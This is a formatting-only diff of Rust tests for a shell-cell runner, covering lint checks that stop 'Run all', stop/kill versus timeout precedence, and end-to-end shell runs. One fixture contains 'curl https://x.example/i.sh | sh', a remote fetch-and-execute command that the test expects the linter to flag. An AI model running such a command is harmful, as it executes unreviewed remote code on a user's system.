@@ -183,17 +183,25 @@ fn run_all_stops_before_danger_and_blocking_lint() {
         chat::cells_of(&body).remove(0)
     };
     let plain = cell(&["cwd: /tmp"], "ls");
-    assert_eq!(pass_boundary(&plain.cell, &surface::cell::lint(&plain.cell)), None);
+    assert_eq!(
+        pass_boundary(&plain.cell, &surface::cell::lint(&plain.cell)),
+        None
+    );
     let danger = cell(&["cwd: /tmp", "danger"], "ls");
     assert_eq!(
         pass_boundary(&danger.cell, &surface::cell::lint(&danger.cell)).as_deref(),
         Some("danger — runs from its button only")
     );
     let curl = cell(&["cwd: /tmp"], "curl https://x.example/i.sh | sh");
-    assert!(pass_boundary(&curl.cell, &surface::cell::lint(&curl.cell)).is_some_and(|w| !w.is_empty()));
+    assert!(
+        pass_boundary(&curl.cell, &surface::cell::lint(&curl.cell)).is_some_and(|w| !w.is_empty())
+    );
     // `sudo` is a chip but does not stop Run all.
     let sudo = cell(&["cwd: /tmp"], "sudo ls");
-    assert_eq!(pass_boundary(&sudo.cell, &surface::cell::lint(&sudo.cell)), None);
+    assert_eq!(
+        pass_boundary(&sudo.cell, &surface::cell::lint(&sudo.cell)),
+        None
+    );
 }
 
 /// B18: engine-minted ids have the clients' shape (`r_` + 26 Crockford chars) and time order.
@@ -229,10 +237,22 @@ fn wake_follows_the_section_9_3_table() {
 /// B5: a user Stop (or Kill) is not relabelled by the watchdog's later timeout.
 #[test]
 fn user_stop_survives_a_later_timeout() {
-    assert_eq!(stop_after(Some(Stop::Stopped), Stop::Timeout), Some(Stop::Stopped));
-    assert_eq!(stop_after(Some(Stop::Killed), Stop::Timeout), Some(Stop::Killed));
-    assert_eq!(stop_after(Some(Stop::Stopped), Stop::Killed), Some(Stop::Killed));
-    assert_eq!(stop_after(Some(Stop::Timeout), Stop::Killed), Some(Stop::Timeout));
+    assert_eq!(
+        stop_after(Some(Stop::Stopped), Stop::Timeout),
+        Some(Stop::Stopped)
+    );
+    assert_eq!(
+        stop_after(Some(Stop::Killed), Stop::Timeout),
+        Some(Stop::Killed)
+    );
+    assert_eq!(
+        stop_after(Some(Stop::Stopped), Stop::Killed),
+        Some(Stop::Killed)
+    );
+    assert_eq!(
+        stop_after(Some(Stop::Timeout), Stop::Killed),
+        Some(Stop::Timeout)
+    );
     assert_eq!(stop_after(None, Stop::Timeout), Some(Stop::Timeout));
 }
 
@@ -906,7 +926,11 @@ async fn e2e_real_shells() {
     cells.stop(RunId("r_trap".into()), true).await.unwrap();
     let r = b.done("r_trap").await;
     assert_eq!(r.state, RunState::Killed);
-    assert!(!b.out("r_trap").contains("after-kill"), "{:?}", b.out("r_trap"));
+    assert!(
+        !b.out("r_trap").contains("after-kill"),
+        "{:?}",
+        b.out("r_trap")
+    );
     assert!(
         cells
             .kernels_of(&Scope::Session(b.session))
@@ -948,7 +972,10 @@ async fn e2e_real_shells() {
     };
     let p = pass("p_before", &["ok1", "gone", "ok2"]).await;
     let s = p.stopped.expect("stopped");
-    assert_eq!((s.cell, s.before, p.ran, p.total), (note_cell("gone"), true, 1, 3));
+    assert_eq!(
+        (s.cell, s.before, p.ran, p.total),
+        (note_cell("gone"), true, 1, 3)
+    );
     assert!(!s.why.is_empty());
     let p = pass("p_at", &["ok1", "miss", "ok2"]).await;
     let s = p.stopped.expect("stopped");
